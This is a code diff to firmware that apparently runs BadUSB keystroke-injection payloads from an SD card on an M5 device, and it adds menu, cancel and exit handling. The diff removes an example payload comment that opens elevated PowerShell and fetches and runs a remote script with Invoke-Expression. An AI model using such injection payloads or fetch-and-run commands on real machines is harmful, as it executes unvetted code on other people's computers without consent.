@@ -17,14 +17,14 @@ USBHIDKeyboard Kb;
 
 /* Example of payload file
 
-REM Author: UNC0V3R3D
-REM Description: Uses powershell to rotate the monitor by 90 degrees.
+REM Author: example
+REM Description: open Cmd to type a message
 REM Version: 1.0
 REM Category: FUN
 DELAY 800
 GUI r
 DELAY 800
-STRING powershell Start-Process powershell -Verb runAs
+STRING cmd
 DELAY 800
 ENTER
 DELAY 800
@@ -32,8 +32,10 @@ LEFTARROW
 DELAY 800
 ENTER
 DELAY 500
-STRING Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/UNC0V3R3D/resources/main/monitor_rotation.ps1").Content
-
+ALT ENTER
+DELAY 500
+STRINGLN encho Is this funny??
+REPEAT 20
 
 */
 
@@ -61,6 +63,17 @@ void key_input(FS fs, String bad_script) {
       line = 0;
 
       while (payloadFile.available()) {
+        if(checkSelPress()) {
+          options = {
+            {"Continue",  [=](){ yield(); }},
+            {"Main Menu", [=](){ returnToMenu=true;}},
+          };
+          delay(250);
+          loopOptions(options);
+          delay(250);
+          tft.setTextSize(FP);
+
+        }        
         lineContent = payloadFile.readStringUntil('\n');  // O CRLF é uma combinação de dois caracteres de controle: o “Carriage Return” (retorno de carro) representado pelo caractere “\r” e o “Line Feed” (avanço de linha) representado pelo caractere “\n”.
         if (lineContent.endsWith("\r")) lineContent.remove(lineContent.length() - 1);
 
@@ -226,46 +239,56 @@ void usb_setup() {
   bad_script = "/badpayload.txt";
 
   FS *fs;
+  bool first_time=true;
+NewScript:
   if(setupSdCard()) {
     bool teste=false;
     options = {
       {"SD Card", [&]()  { fs=&SD; }},
       {"LittleFS", [&]()   { fs=&LittleFS; }},
+      {"Main Menu", [&]()   { fs=nullptr; }},
     };
     delay(200);
     loopOptions(options);
   } else fs=&LittleFS;
 
-  bad_script = loopSD(*fs,true);
-  tft.fillScreen(BGCOLOR);
-  // drawMainMenu(4);
+  if(fs!=nullptr) {
+    bad_script = loopSD(*fs,true);
+    tft.fillScreen(BGCOLOR);
+    // drawMainMenu(4);
+    if(first_time) {
+      options = {
+        {"US Inter",    [=]() { chooseKb(KeyboardLayout_en_US); }},
+        {"PT-BR ABNT2", [=]() { chooseKb(KeyboardLayout_pt_BR); }},
+        {"PT-Portugal", [=]() { chooseKb(KeyboardLayout_pt_PT); }},
+        {"AZERTY FR",   [=]() { chooseKb(KeyboardLayout_fr_FR); }},
+        {"es-Espanol",  [=]() { chooseKb(KeyboardLayout_es_ES); }},
+        {"it-Italiano", [=]() { chooseKb(KeyboardLayout_it_IT); }},
+        {"en-UK",       [=]() { chooseKb(KeyboardLayout_en_UK); }},
+        {"de-DE",       [=]() { chooseKb(KeyboardLayout_de_DE); }},
+        {"sv-SE",       [=]() { chooseKb(KeyboardLayout_sv_SE); }},
+        {"da-DK",       [=]() { chooseKb(KeyboardLayout_da_DK); }},
+        {"hu-HU",       [=]() { chooseKb(KeyboardLayout_hu_HU); }},
+      };
+      delay(200);
+      loopOptions(options,false,true,"Keyboard Layout");
+      if (!kbChosen) Kb.begin(); // starts the KeyboardLayout_en_US as default if nothing had beed chosen (cancel selection)
+      USB.begin();
+      displayRedStripe("Preparing",TFT_WHITE, FGCOLOR);
+      delay(2000);
+      first_time=false;
+    }
+    key_input(*fs, bad_script);
 
-  options = {
-    {"US Inter",    [=]() { chooseKb(KeyboardLayout_en_US); }},
-    {"PT-BR ABNT2", [=]() { chooseKb(KeyboardLayout_pt_BR); }},
-    {"PT-Portugal", [=]() { chooseKb(KeyboardLayout_pt_PT); }},
-    {"AZERTY FR",   [=]() { chooseKb(KeyboardLayout_fr_FR); }},
-    {"es-Espanol",  [=]() { chooseKb(KeyboardLayout_es_ES); }},
-    {"it-Italiano", [=]() { chooseKb(KeyboardLayout_it_IT); }},
-    {"en-UK",       [=]() { chooseKb(KeyboardLayout_en_UK); }},
-    {"de-DE",       [=]() { chooseKb(KeyboardLayout_de_DE); }},
-    {"sv-SE",       [=]() { chooseKb(KeyboardLayout_sv_SE); }},
-    {"da-DK",       [=]() { chooseKb(KeyboardLayout_da_DK); }},
-    {"hu-HU",       [=]() { chooseKb(KeyboardLayout_hu_HU); }},
-  };
-  delay(200);
-  loopOptions(options,false,true,"Keyboard Layout");
-  if (!kbChosen) Kb.begin(); // starts the KeyboardLayout_en_US as default if nothing had beed chosen (cancel selection)
-  USB.begin();
-  displayRedStripe("Preparing",TFT_WHITE, FGCOLOR);
-  delay(2000);
-  key_input(*fs, bad_script);
-
-  displayRedStripe("Payload Sent",TFT_WHITE, FGCOLOR);
-  checkSelPress();
-  while (!checkSelPress()) {
-      // nothing here, just to hold the screen press Ok of M5.
-  }
+    displayRedStripe("Payload Sent",TFT_WHITE, FGCOLOR);
+    checkSelPress();
+    while (!checkSelPress()) {
+        // nothing here, just to hold the screen press Ok of M5.
+    }
+    if(returnToMenu) return;
+    // Try to run a new script on the same device
+    goto NewScript;
+  } else displayWarning("Canceled");
   returnToMenu=true;
 
 }
@@ -313,9 +336,11 @@ void usb_keyboard() {
     {"sv-SE",       [=]() { chooseKb(KeyboardLayout_sv_SE); }},
     {"da-DK",       [=]() { chooseKb(KeyboardLayout_da_DK); }},
     {"hu-HU",       [=]() { chooseKb(KeyboardLayout_hu_HU); }},
+    {"Main Menu",   [=]() { returnToMenu=true; }},
   };
   delay(200);
   loopOptions(options,false,true,"Keyboard Layout");
+  if(returnToMenu) return;
   USB.begin();
 
   tft.setTextColor(FGCOLOR, BGCOLOR);
@@ -323,7 +348,11 @@ void usb_keyboard() {
   drawMainBorder();
   tft.setCursor(10,28);
   tft.println("Usb Keyboard:");
+  #if defined(CARDPUTER)
+  tft.drawCentreString("> fn + esc to exit <", WIDTH / 2, HEIGHT-20,1);
+  #endif
   tft.setTextSize(FM);
+  String _mymsg="";
 
   while(1) {
     Keyboard.update();
@@ -333,6 +362,10 @@ void usb_keyboard() {
 
         KeyReport report = { 0 };
         report.modifiers = status.modifiers;
+
+        bool Fn = status.fn;
+        if(Fn && Keyboard.isKeyPressed('`')) break;
+
         uint8_t index = 0;
         for (auto i : status.hid_keys) {
           report.keys[index] = i;
@@ -356,7 +389,9 @@ void usb_keyboard() {
 
         if (keyStr.length() > 0) {
           drawMainBorder(false);
+          if(_mymsg.length()>keyStr.length()) tft.drawCentreString("                                  ", WIDTH / 2, HEIGHT / 2,1); // clears screen
           tft.drawCentreString("Pressed: " + keyStr, WIDTH / 2, HEIGHT / 2,1);
+          _mymsg=keyStr;
           delay(100);
         }
       }
